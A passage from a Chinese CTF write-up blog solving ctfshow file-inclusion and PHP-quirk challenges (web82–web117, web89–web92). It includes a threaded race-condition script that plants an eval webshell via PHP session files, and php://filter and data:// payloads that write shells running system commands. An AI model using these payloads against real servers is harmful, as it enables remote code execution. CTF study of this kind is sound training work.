print(res.text)</span></span><br><span class="line">        <span class="comment">#print(&#x27;======= write done! ======&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>): <span class="comment"># read()函数利用session临时文件生成一句话木马，实现rce</span></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/3.php&#x27;,&#x27;&lt;?=eval($_POST[2]);?&gt;&#x27;);&quot;</span>     <span class="comment"># 使用file_put_contents()php内置函数生成名为3.php的shell文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data1,cookies=cookies)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        res2 = session.get(url+<span class="string">&#x27;3.php&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(res2.text)</span></span><br><span class="line">        <span class="keyword">if</span> res2.status_code == <span class="number">200</span>:     <span class="comment">#若3.php成功生成，则返回Done!，否则返回失败的状态码</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++++ Done! +++++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(res2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    event = threading.Event()       </span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:     <span class="comment"># 为每个函数设置5个线程并发执行</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="comment">#print(&#x27;*&#x27;*50)</span></span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="comment">#print(&#x27;=&#x27;*50)</span></span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>在显示Done!后，访问url+3.php，并POST方式传参，即可获取flag：</p><h1 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h1><p>做的时间没有竞争环境，只能看wp了。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>同web82，虽然销毁了session，但我们还是可以自行创建。多运行一会脚本就行了。</p><h1 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同web82。<br>这题在包含文件命令之前执行了删除/tmp目录下所有文件的操作，貌似session_upload的方式失效了，但实际上该方法仍可使用。<br>原因在于cpu并发执行时存在间隔时间即分片，当我们多线程请求后，就有可能一个线程中system(“rm -rf /tmp/*”);命令执行完了，另一个线程没有执行删除命令但已写入sess_PHPSESSID文件，这样第一个线程文件包含时session文件仍然存在。基于此可生成一句话木马。<br>脚本多执行一段时间就会发现返回码从404变成了200ヾ(•ω•`)o</p><h1 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是运行web82的脚本。<br>同样是机制问题，多线程并发导致的执行错序。使得不可能成立的逻辑成立了。。。</p><h1 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h1><p>82脚本</p><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a><br>看这个：<a href="https://blog.csdn.net/weixin_46003360/article/details/119045296">https://blog.csdn.net/weixin_46003360/article/details/119045296</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>操作中多了一个die函数，因此得用二次加密来避免读取。<br>我们这样考虑：GET中的file参数需要进行urldecode，因此可以通过完全urlencode来绕过过滤，这道题需要用到的payload的是rot13（凯撒位移13位）<code>?file=php://filter/write=string.rot13/resource=3.php</code><br>注意，这串payload意义为写入一个名称为3.php的文件。其中内容是需要服务器用rot13来解密。<br>因此，我们初步构建payload是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：file=php://filter/write=string.rot13/resource=3.php</span><br><span class="line">POST：content=content=&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>对POST rot13加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：file=php://filter/write=string.rot13/resource=3.php</span><br><span class="line">POST：content=content=&lt;?cuc flfgrz(&#x27;png s*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>GET还有过滤，因此可以对GET二次全字符URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：file=php://filter/write=string.rot13/resource=3.php</span><br><span class="line">POST：content=content=&lt;?cuc flfgrz(&#x27;png s*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681916158853-38ff06cb-b34d-4d2e-9dc2-4d4363a6e780.png" alt="image.png"><br>最后payload是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line">POST：content=&lt;?cuc flfgrz(&#x27;png s*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后我们访问3.php看看是否写入成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681916366866-15d0caf0-a95f-4252-939f-74296f6b16f3.png" alt="image.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>当然，我们除了rot13加密之外，也可以使用base64加密，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat f*&#x27;);?&gt;</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=3.php</span><br><span class="line">二次URL全字符编码：</span><br><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%34%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure><p>但是你觉得可以了，但是并没有，因为加上拼接字符之后，文本不满足base64解析要求：<br>题目拼接了一个：<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，解析时会先过滤点不在解析范围的字符，剩下<code>phpdie</code>六个字符，base64的编码算法是4个字符为一组，如果不对其编辑的话会导致解码错误，因此我们可以在content前加两个字符来阻断前面的解密。<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%3</span><br><span class="line">content=aaPD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</span><br></pre></td></tr></table></figure><p>可以正确获得到flag。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681917167968-393a3c78-d4d9-4026-a62d-7e3f9c29adc5.png" alt="image.png"></p><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>我们可以发现我们想要去除的代码片其实是一个XML标签，因此我们可以想到一个函数去去除它：<code>strip_tags</code><br>如果这样进行处理的话，我们想要写入的一句话也会被处理。<br>不过，我们的php://filter是可以使用多个过滤器的，因此我们可以先对我们想要的一句话进行编码，过滤器中先使用strip_tags函数进行处理再使用对应的解码方法即可！<br>payload；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/string.strip_tags|convert.base64-decode/resource=4.php</span><br><span class="line">content=PD89c3lzdGVtKCd0YWMgZionKTs/Pg==</span><br></pre></td></tr></table></figure><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>又发现了一个比较好用的加解密工具网站：<a href="https://cyberchef.org/">https://cyberchef.org/</a></p><h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着过滤了很多，但是需要用的都没有被过滤到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4</span></span><br></pre></td></tr></table></figure><p>直接使用这个payload，但是要注意，base64加密的内容在使用时可以将末尾的=去掉而不影响解密结果。<br>PS：base64的等号是在加密内容时字节不足4为时的补位，因此删掉不影响解密。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681918439782-9fa00570-80c5-4716-ab36-61f68c1afd51.png" alt="image.png"></p><h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>进来是个视频，题目中提示了misc+lfi（文件包含）<br>下载视频，用010打开，发现最后存在一个png格式文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681960087367-7d6d470d-ec13-4672-bea8-280e7944a1ee.png" alt="image.png"><br>右键选择保存到新文件，修改后缀名为png并打开：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681960160130-d7100955-1eee-481f-a525-fe6394a6296f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681960139979-5b6c3923-d96e-410d-b713-4813ed3f3667.png" alt="pic.png"></p><p>直接读：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681960744696-26030043-ff06-4e86-9428-528c1107d745.png" alt="image.png"></p><h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><blockquote><p><a href="https://blog.csdn.net/rawrecruit/article/details/123952695">https://blog.csdn.net/rawrecruit/article/details/123952695</a><br><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a><br><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">https://blog.csdn.net/qq_44657899/article/details/109300335</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>和前面的题类似，但是base64和rot13被过滤了，那就需要找到其他能够使用的方法比如：<br><code>convert.iconv</code>、<code>ucs-2</code>和<code>ucs-4</code><br>ucs-2  二位一反转，字符个数要在偶数位上，ucs-4 四位一反转，字符个数要是4的倍数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;&lt;?php @eval($_POST[aaaa]);?&gt;&quot;</span></span><br><span class="line">L=<span class="built_in">len</span>(payload)</span><br><span class="line"><span class="keyword">if</span> L%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(L)</span><br><span class="line">st=<span class="built_in">list</span>(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(st)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        st[i],st[i-<span class="number">1</span>]=st[i-<span class="number">1</span>],st[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> st:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET：</span><br><span class="line">?file=php://<span class="built_in">filter</span>/write=convert.iconv.UCS-2LE.UCS-2BE/resource=<span class="number">2.</span>php</span><br><span class="line">POST：</span><br><span class="line">contents=?&lt;hp pe@av(l_$OPTSa[aa]a;)&gt;?</span><br></pre></td></tr></table></figure><p>然后：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681961430242-17af6053-9b2d-47fb-9a74-42f44c83dff9.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web89-web105php特性篇（一）</title>
      <link href="/2023/05/16/web89-web105php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/05/16/web89-web105php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遇事不决先试试数组捏，<code>?num[]=1</code></p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4476后加任意字符即可。<code>?num=4476a</code>。<br>我们默认的上传类型就是字符型，我们直接在末尾添加一个字符就可以。</p><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        echo <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题一上来没看懂，要搞懂他先要理解他的过滤是什么意思。</p><ul><li><code>^</code> “行首”元字符 (^) 仅匹配字符串的开始位置</li><li><code>**$**</code>“行末”元字符 ($) 仅匹配字符串末尾，或者最后的换行符(除非设置了 D 修饰符)</li></ul><p>默认情况下，preg_match函数会认为目标字符串是单行组成的，当目标字符串中有换行符或者匹配中出现^或者$会受到影响。<br>并且末尾的m的意义如下。<br>因此综上意思就是，要求传入内容中有php，但是第一行中没有php。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977422503-fb5ac281-d0e2-4af8-a0ba-db71b32378ad.png" alt="image.png"><br>因此payload：<code>abc%0aphp</code></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>附PCRE模式修正符</p><blockquote><p>参考文章·：<a href="https://blog.csdn.net/forest_fire/article/details/50944901">https://blog.csdn.net/forest_fire/article/details/50944901</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977497562-fb227ad1-c636-42ab-8b63-5ef842146ece.png" alt="image.png"></p><p>wp中提到的另一个漏洞：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以。<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span>    <span class="comment">//十六进制</span></span><br><span class="line">?num=<span class="number">010574</span>    <span class="comment">//八进制</span></span><br><span class="line">?num=<span 